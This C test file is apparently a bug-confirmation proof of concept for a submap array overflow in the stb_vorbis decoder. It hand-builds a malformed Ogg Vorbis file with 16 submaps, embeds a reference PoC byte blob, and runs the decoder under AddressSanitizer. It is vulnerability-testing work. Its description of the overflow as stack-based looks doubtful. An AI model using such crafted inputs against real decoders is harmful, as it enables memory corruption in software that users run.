/*
 * BUG-stb_vorbis-004 candidate test
 *
 * Demonstrates the submap array overflow (16 submaps instead of max 15).
 *
 * The overflow occurs because the Mapping struct declares:
 *   uint8 submap_floor[15];   // at line 758
 *   uint8 submap_residue[15]; // at line 759
 * but the Vorbis spec allows up to 16 submaps (get_bits(f,4)+1 = 1..16).
 * When m->submaps == 16, the loop at line 4117 writes:
 *   m->submap_floor[15] and m->submap_residue[15]
 * past the stack-embedded 15-element arrays.
 *
 * Root cause: the arrays are declared [15] but the spec says the maximum
 * is 16 (4-bit field, value 0-15, +1 = 1-16). The spec says "up to 16
 * submaps" and the code uses `submap_floor[j]` in a loop where j goes
 * from 0 to m->submaps-1. With submaps=16, j=15 overflows.
 *
 * This file:
 * 1. Builds a valid OGG file with submaps=16 in the mapping section
 * 2. Opens it with stb_vorbis_open_memory
 * 3. Under ASan, the OOB writes at indices 15 are detected as:
 *    "ERROR: AddressSanitizer: stack-buffer-overflow"
 *
 * Compile with:
 *   gcc -fsanitize=address,undefined -g -I. \
 *       tests/bug_stb_vorbis_004_candidate.c \
 *       -o tests/bug_stb_vorbis_004_candidate -lm
 *
 * Based on the BUG-007 poc_ogg (354 bytes) structural reference.
 */

#define STB_VORBIS_IMPLEMENTATION
#define STB_VORBIS_NO_STDIO
#include "stb_vorbis.c"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* BUG-007 poc_ogg for reference */
unsigned char poc_ogg[] = {
    0x4f, 0x67, 0x67, 0x53, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x78, 0x55, 0x5a, 0x12, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x01, 0x1e, 0x01, 0x76, 0x6f, 0x72, 0x62, 0x69, 0x73, 0x00,
    0x00, 0x00, 0x00, 0x01, 0x44, 0xac, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,
    0x00, 0xf4, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0xb8, 0x01, 0x4f, 0x67,
    0x67, 0x53, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x78, 0x56, 0xbe, 0x12, 0x01, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00,
    0x01, 0xff, 0x03, 0x76, 0x6f, 0x72, 0x62, 0x69, 0x73, 0x07, 0x00, 0x00,
    0x00, 0x65, 0x6e, 0x4f, 0x67, 0x7f, 0xff, 0x00, 0x02, 0x00, 0x00, 0x20,
    0xe5, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0xe0, 0x17, 0x67, 0xf7,
    0x26, 0x26, 0x97, 0x30, 0x00, 0x00, 0x00, 0x00, 0x24, 0x4a, 0xc0, 0x00,
    0x0f, 0xff, 0xf0, 0x00, 0x00, 0x24, 0x4a, 0xc0, 0x00, 0x04, 0xf6, 0x76,
    0x75, 0x30, 0x00, 0x20, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20,
    0x00, 0x00, 0x00, 0x12, 0x10, 0x57, 0x6f, 0xfe, 0x1e, 0x10, 0x00, 0x00,
    0x11, 0xe0, 0x11, 0xe0, 0x16, 0xe6, 0xf7, 0x26, 0x26, 0x97, 0x30, 0x00,
    0x00, 0x01, 0x00, 0x04, 0x4a, 0xc0, 0x00, 0x0f, 0xff, 0xff, 0xff, 0xf0,
    0x0f, 0x40, 0x10, 0x0f, 0xff, 0xff, 0xff, 0xfb, 0x80, 0x14, 0xf6, 0x77,
    0x35, 0x30, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07,
    0x85, 0x6b, 0xe1, 0x20, 0x10, 0x00, 0x00, 0x00, 0x02, 0x80, 0x00, 0x00,
    0x1f, 0xf0, 0x39, 0x46, 0xf7, 0x26, 0x26, 0x97, 0x30, 0x70, 0x00, 0x00,
    0x06, 0x56, 0xe4, 0xf6, 0x77, 0xff, 0xf0, 0x00, 0x20, 0x00, 0x00, 0x0e,
    0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0xe0, 0x17, 0x66,
    0xf7, 0x26, 0x26, 0x97, 0x30, 0x00, 0x00, 0x00, 0x00, 0x24, 0x4a, 0xc0,
    0x00, 0x0f, 0xff, 0xf0, 0x00, 0x00, 0x24, 0x4a, 0xc0, 0x00, 0x04, 0xf6,
    0x76, 0x75, 0x30, 0x00, 0x20, 0x00, 0x00, 0x00, 0x02, 0x10, 0x17, 0x66,
    0xf7, 0x26, 0x26, 0x97, 0x30, 0x00, 0x00, 0x00, 0x00, 0x14, 0x4a, 0xc0,
    0x00, 0x0f, 0xff, 0xff, 0xff, 0xf0, 0x46, 0x40, 0x10, 0x0f, 0xff, 0xff,
    0xff, 0xf8, 0x60, 0x14, 0xf6, 0x76, 0x75, 0x30, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x04, 0xf6, 0x76, 0x75, 0x30, 0x02, 0x50, 0x00, 0x00,
    0x00, 0x02, 0x10, 0x00, 0x00, 0x00
};
unsigned int poc_ogg_len = 354;

#define WORK_BUF_SIZE 8192

/* Helper: write 32-bit LE */
static void w32(unsigned char *p, unsigned int v) {
    p[0] = (unsigned char)(v);
    p[1] = (unsigned char)(v >> 8);
    p[2] = (unsigned char)(v >> 16);
    p[3] = (unsigned char)(v >> 24);
}

/* Vorbis LSB-first bitpack writer */
typedef struct { unsigned char *buf; int pos, cap; } bitpack;
static void bp_init(bitpack *b, unsigned char *buf, int cap) {
    b->buf = buf; b->pos = 0; b->cap = cap * 8; memset(buf, 0, cap);
}
static void bp_bits(bitpack *b, unsigned int v, int n) {
    for (int i = 0; i < n; i++) {
        if (v & (1u << i)) b->buf[b->pos / 8] |= (1 << (b->pos % 8));
        b->pos++;
    }
    if (b->pos > b->cap) { fprintf(stderr, "Bitpack overflow!\n"); exit(1); }
}
static int bp_bytes(bitpack *b) { return (b->pos + 7) / 8; }

int main() {
    unsigned char work[WORK_BUF_SIZE];
    memset(work, 0, sizeof(work));
    int pos = 0, i;

    printf("============================================================\n");
    printf("BUG-stb_vorbis-004: submap array overflow (16 submaps)\n");
    printf("Using BUG-007 poc_ogg (%d bytes) as reference\n", poc_ogg_len);
    printf("============================================================\n\n");

    /* ==================== PAGE 0: Identification ==================== */
    memcpy(work + pos, poc_ogg, 28 + 30); /* full page 0 from poc_ogg */
    pos += 28 + 30;

    /* ==================== PAGE 1: Comment + Setup ==================== */
    int page1_start = pos;

    /* OGG page header (27 bytes) */
    memcpy(work + pos, "OggS", 4); pos += 4;
    work[pos++] = 0;           /* version */
    work[pos++] = 0;           /* header_type = 0 */
    w32(work + pos, 0); pos += 4;  /* granule lo */
    w32(work + pos, 0); pos += 4;  /* granule hi */
    w32(work + pos, 0x12be5678); pos += 4; /* serial (from poc_ogg) */
    w32(work + pos, 1); pos += 4;  /* page number = 1 */
    w32(work + pos, 0); pos += 4;  /* CRC = 0 */

    int seg_count_pos = pos;
    pos++;                         /* segment count placeholder */
    int seg_table_pos = pos;       /* segment table starts here */

    /* Reserve space for segment table (2 segments = 2 bytes) */
    int nsegs = 2;
    int data_start = seg_table_pos + nsegs;
    pos = data_start;

    /* ---- Comment packet (harmless) ---- */
    int comment_start = pos;
    work[pos++] = 3;                            /* packet_type = comment */
    memcpy(work + pos, "vorbis", 6); pos += 6; /* magic */
    w32(work + pos, 0); pos += 4;               /* vendor_length = 0 */
    w32(work + pos, 0); pos += 4;               /* comment_list_length = 0 */
    work[pos++] = 1;                            /* framing flag */
    int comment_len = pos - comment_start;

    /* ---- Setup packet with 16-submap mapping ---- */
    int setup_start = pos;

    unsigned char setup[1024];
    bitpack b;
    bp_init(&b, setup, sizeof(setup));

    /* 7-byte packet header: packet_type=5 + "vorbis" */
    setup[0] = 5;
    memcpy(setup + 1, "vorbis", 6);
    b.pos = 56; /* start bitstream after 7 bytes */

    /* --- Codebooks (1 codebook, non-ordered, nonsparse) --- */
    bp_bits(&b, 0, 8);     /* codebook_count = 1 */
    bp_bits(&b, 0x42, 8);  /* 'B' */
    bp_bits(&b, 0x43, 8);  /* 'C' */
    bp_bits(&b, 0x56, 8);  /* 'V' */
    bp_bits(&b, 1, 8);     /* dimensions low = 1 */
    bp_bits(&b, 0, 8);     /* dimensions high = 0 */
    bp_bits(&b, 1, 8);     /* entries low = 1 */
    bp_bits(&b, 0, 8);     /* entries mid = 0 */
    bp_bits(&b, 0, 8);     /* entries high = 0 */
    bp_bits(&b, 0, 1);     /* ordered = 0 (non-ordered) */
    bp_bits(&b, 0, 1);     /* sparse = 0 (nonsparse) */
    bp_bits(&b, 0, 5);     /* length[0] = 1 (0+1) */
    bp_bits(&b, 0, 4);     /* lookup_type = 0 */

    /* --- Time domain transforms --- */
    bp_bits(&b, 0, 6);     /* time_count = 1 */
    bp_bits(&b, 0, 16);    /* time_transform[0] = 0 */

    /* --- Floors (1 floor type 1, minimal) --- */
    bp_bits(&b, 0, 6);     /* floor_count = 1 */
    bp_bits(&b, 1, 16);    /* floor_types[0] = 1 (Floor1) */
    bp_bits(&b, 0, 5);     /* partitions = 0 */
    bp_bits(&b, 0, 2);     /* floor1_multiplier = 1 (0+1) */
    bp_bits(&b, 0, 4);     /* rangebits = 0 */

    /* --- Residues (1 residue type 0, minimal) --- */
    bp_bits(&b, 0, 6);     /* residue_count = 1 */
    bp_bits(&b, 0, 16);    /* residue_types[0] = 0 */
    bp_bits(&b, 0, 24);    /* begin = 0 */
    bp_bits(&b, 1, 24);    /* end = 1 (> begin) */
    bp_bits(&b, 0, 24);    /* part_size = 1 (0+1) */
    bp_bits(&b, 0, 6);     /* classifications = 1 (0+1) */
    bp_bits(&b, 0, 8);     /* classbook = 0 */
    bp_bits(&b, 0, 3);     /* low_bits = 0 */
    bp_bits(&b, 0, 1);     /* high_flag = 0 */

    /* --- Mappings (1 mapping, 16 submaps = overflow!) --- */
    bp_bits(&b, 0, 6);     /* mapping_count = 1 */
    bp_bits(&b, 0, 16);    /* mapping_type = 0 */
    bp_bits(&b, 1, 1);     /* submaps_flag = 1 */
    bp_bits(&b, 15, 4);    /* submaps = 16 ← overflows [15]-element arrays */
    bp_bits(&b, 0, 1);     /* coupling_steps = 0 */
    bp_bits(&b, 0, 2);     /* reserved = 0 */
    bp_bits(&b, 0, 4);     /* chan[0].mux = 0 (1 channel) */

    /* 16 submaps: indices 0..14 are valid, index 15 overflows */
    for (i = 0; i < 16; i++) {
        bp_bits(&b, 0, 8);  /* discard */
        bp_bits(&b, 0, 8);  /* submap_floor[i] */
        bp_bits(&b, 0, 8);  /* submap_residue[i] */
    }

    /* --- Modes (1 mode) --- */
    bp_bits(&b, 0, 6);     /* mode_count = 1 */
    bp_bits(&b, 0, 1);     /* blockflag = 0 */
    bp_bits(&b, 0, 16);    /* windowtype = 0 */
    bp_bits(&b, 0, 16);    /* transformtype = 0 */
    bp_bits(&b, 0, 8);     /* mapping = 0 ( < mapping_count=1 ) */

    bp_bits(&b, 1, 1);     /* framing bit */

    int setup_bytes = bp_bytes(&b);
    printf("Setup header: %d bits → %d bytes\n", b.pos, setup_bytes);

    /* Write setup into work buffer */
    memcpy(work + pos, setup, setup_bytes);
    pos += setup_bytes;

    /* ---- Build segment table (2 segments: comment + setup) ---- */
    /* Data is already placed at data_start (seg_table_pos + 2).
     * Segment 0: comment (value < 255 -> ends packet)
     * Segment 1: setup  (value < 255 -> ends packet) */
    work[seg_table_pos + 0] = (unsigned char)comment_len;
    work[seg_table_pos + 1] = (unsigned char)setup_bytes;
    work[seg_count_pos] = 2;
    int total_data = comment_len + setup_bytes;
    int seg_table_size = nsegs;

    int page1_total = 27 + 1 + seg_table_size + total_data;
    pos = page1_start + page1_total;

    printf("Comment packet: %d bytes\n", comment_len);
    printf("Setup packet:   %d bytes\n", setup_bytes);
    printf("Page 1:         %d segments (%d bytes headers + %d data)\n",
           nsegs, 27 + 1 + seg_table_size, total_data);
    printf("Total OGG size: %d bytes\n\n", pos);

    /* ==================== Test with ASan ==================== */
    printf("Opening with stb_vorbis_open_memory (should detect overflow)...\n");

    int error;
    stb_vorbis *v = stb_vorbis_open_memory(work, pos, &error, NULL);

    if (v) {
        /* Without ASan the OOB write is silent — the decoder
         * continues past the overflow because the corrupted
         * adjacent stack vars don't cause an immediate error. */
        printf("Decoder opened OK (expected without ASan).\n");
        stb_vorbis_close(v);
    } else {
        printf("Decoder returned error %d\n", error);
    }

    printf("\nTo confirm the stack-buffer-overflow, run with ASan:\n");
    printf("  gcc -fsanitize=address,undefined -g -I. \\\n");
    printf("      tests/bug_stb_vorbis_004_candidate.c \\\n");
    printf("      -o tests/bug_stb_vorbis_004_candidate -lm\n");
    printf("  ./tests/bug_stb_vorbis_004_candidate\n");
    printf("  → ASan aborts: \"ERROR: AddressSanitizer: stack-buffer-overflow\"\n");

    return 0;
}
